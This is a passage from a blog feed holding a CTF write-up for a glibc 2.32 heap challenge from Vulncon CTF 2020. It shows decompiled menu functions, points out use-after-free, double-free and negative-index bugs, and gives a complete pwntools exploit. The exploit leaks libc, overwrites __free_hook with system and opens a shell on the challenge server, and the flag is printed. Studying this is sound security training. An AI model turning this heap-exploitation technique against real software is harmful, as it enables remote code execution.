+  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// ST0C_4
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { endbr64 }
+  v3 <span style="color:#f92672">=</span> a1;
+  v1 <span style="color:#f92672">=</span> sub_15DC((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v3);
+  sub_1140(<span style="color:#e6db74">&#34;input: &#34;</span>);
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sub_1170</span>(qword_4060[v1]);
+}
+</code></pre></div><p>no limitation on index we can do use after free</p>
+<h4 id="show-function">Show function</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> __usercall sub_1547<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rbp<span style="color:#f92672">&gt;</span>)
+{
+  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp-Ch] [rbp-Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { endbr64 }
+  v4 <span style="color:#f92672">=</span> a1;
+  v1 <span style="color:#f92672">=</span> sub_15DC((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v4);
+  v3 <span style="color:#f92672">=</span> v1;
+  result <span style="color:#f92672">=</span> qword_4060[v1];
+  <span style="color:#66d9ef">if</span> ( result )
+    result <span style="color:#f92672">=</span> sub_1120(qword_4060[v3]);
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>no limitation we can show any index</p>
+<h4 id="delete-function">Delete function</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> __usercall sub_15A0<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rbp<span style="color:#f92672">&gt;</span>)
+{
+  <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { endbr64 }
+  v3 <span style="color:#f92672">=</span> a1;
+  v1 <span style="color:#f92672">=</span> sub_15DC((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v3);
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sub_1100</span>(qword_4060[v1]);
+}
+</code></pre></div><p>we can use double free with uaf bug</p>
+<h4 id="index-input">index input</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> __usercall sub_15DC<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rax<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#f92672">&lt;</span>rbp<span style="color:#f92672">&gt;</span>)
+{
+  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rdi
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// rcx
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// rdx
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v5; <span style="color:#75715e">// rt1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// [rsp-14h] [rbp-14h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp-10h] [rbp-10h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v8; <span style="color:#75715e">// [rsp-8h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">__asm</span> { endbr64 }
+  v8 <span style="color:#f92672">=</span> a1;
+  v7 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  sub_1140(<span style="color:#e6db74">&#34;index: &#34;</span>);
+  sub_11A0(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v6);
+  v1 <span style="color:#f92672">=</span> stdin;
+  sub_1150(stdin);
+  <span style="color:#66d9ef">if</span> ( v6 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">15</span> )
+    result <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)v6;
+  <span style="color:#66d9ef">else</span>
+    result <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+  v5 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  v4 <span style="color:#f92672">=</span> v7 <span style="color:#f92672">-</span> v5;
+  <span style="color:#66d9ef">if</span> ( v7 <span style="color:#f92672">!=</span> v5 )
+    result <span style="color:#f92672">=</span> sub_1130(v1, <span style="color:#f92672">&amp;</span>v6, v4, v2);
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>look like we can use out of bond index, it use signed int and we can input negative</p>
+<p>lots of bugs here: use after free, double free, out of bond
+with this bug we can leak libc bss leak libc and overwrite free hook with edit function, why not use double free? it cant because 2.32 have mitigation, so we overwrite free hook to system with edit function</p>
+<h3 id="exploit">Exploit</h3>
+<p>Plan :</p>
+<ul>
+<li>leak bss with show(-11)</li>
+<li>edit index -11 with leak+0x40</li>
+<li>to leak libc symbols stderr show(-11) again</li>
+<li>calculate offset libc</li>
+<li>edit index -11 with libc symbols __free_hook, now __free_hook in index -4</li>
+<li>edit index -4 with system</li>
+<li>create index 1 with input &ldquo;/bin/sh&rdquo;</li>
+<li>delete index 1, so it will trigger system(&quot;/bin/sh&rdquo;)</li>
+</ul>
+<p>Exploit Script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#75715e">#MyTemplate</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./heap&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+ld <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ld-2.32.so&#34;</span>)
+
+lokal <span style="color:#f92672">=</span> False
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf
+<span style="color:#75715e">#context.arch = &#39;&#39;</span>
+
+s    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :xp<span style="color:#f92672">.</span>send(data)
+sa   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendafter(delim,data)
+sl   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :xp<span style="color:#f92672">.</span>sendline(data)
+sla  <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :xp<span style="color:#f92672">.</span>sendlineafter(delim,data)
+r    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :xp<span style="color:#f92672">.</span>recv(numb)
+ru   <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span>True  :xp<span style="color:#f92672">.</span>recvuntil(delims, drop)
+uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u64(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+uu32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x                  :u32(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        Debug <span style="color:#f92672">=</span> True
+<span style="color:#66d9ef">else</span>:
+        Debug <span style="color:#f92672">=</span> False
+
+<span style="color:#66d9ef">if</span> lokal:
+    xp <span style="color:#f92672">=</span> process([ld<span style="color:#f92672">.</span>path, elf<span style="color:#f92672">.</span>path], env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: libc<span style="color:#f92672">.</span>path})
+    <span style="color:#75715e"># xp = process([elf.path])</span>
+    <span style="color:#75715e"># libc = elf.libc</span>
+<span style="color:#66d9ef">else</span>:
+    host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;35.246.22.179&#39;</span>
+    port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;49155&#39;</span>
+    xp <span style="color:#f92672">=</span> remote(host,port)
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+
+<span style="color:#66d9ef">if</span> Debug:
+    context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>,<span style="color:#e6db74">&#34;splitw&#34;</span>,<span style="color:#e6db74">&#34;-h&#34;</span>]
+    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    gdb<span style="color:#f92672">.</span>attach(xp,cmd)
+
+
+<span style="color:#75715e">#Exploit Here</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(idx,size,input):
+        sla(<span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>)
+        sla(<span style="color:#e6db74">&#34;index: &#34;</span>,str(idx))
+        sla(<span style="color:#e6db74">&#34;size: &#34;</span>,str(size))
+        sla(<span style="color:#e6db74">&#34;input: &#34;</span>,input)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx,input):
+        sla(<span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;2&#34;</span>)
+        sla(<span style="color:#e6db74">&#34;index: &#34;</span>,str(idx))
+        sla(<span style="color:#e6db74">&#34;input: &#34;</span>,input)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
+        sla(<span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;3&#34;</span>)
+        sla(<span style="color:#e6db74">&#34;index: &#34;</span>,str(idx))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
+        sla(<span style="color:#e6db74">&#34;exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;4&#34;</span>)
+        sla(<span style="color:#e6db74">&#34;index: &#34;</span>,str(idx))
+
+
+show(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>)
+leak <span style="color:#f92672">=</span> uu64(xp<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>
+<span style="color:#66d9ef">print</span> hex(leak)
+
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>,p64(leak<span style="color:#f92672">+</span><span style="color:#ae81ff">0x40</span>))
+show(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>)
+leaklibc <span style="color:#f92672">=</span> uu64(xp<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+<span style="color:#66d9ef">print</span> hex(leaklibc)
+
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaklibc <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;_IO_2_1_stderr_&#39;</span>]
+<span style="color:#66d9ef">print</span> hex(libc<span style="color:#f92672">.</span>address)
+
+system <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">11</span>,p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]))
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>,p64(system))
+create(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+delete(<span style="color:#ae81ff">1</span>)
+xp<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="/img/vulncon_old.png" alt=""></p>
+<p>Flag : <code>vulncon{0ldsch00l_unl1nk_n3w_4g41n}</code></p>
+]]></content>
+        </item>
         
         <item>
             <title>Writeup Web Vulncon CTF 2020 Swigger</title>
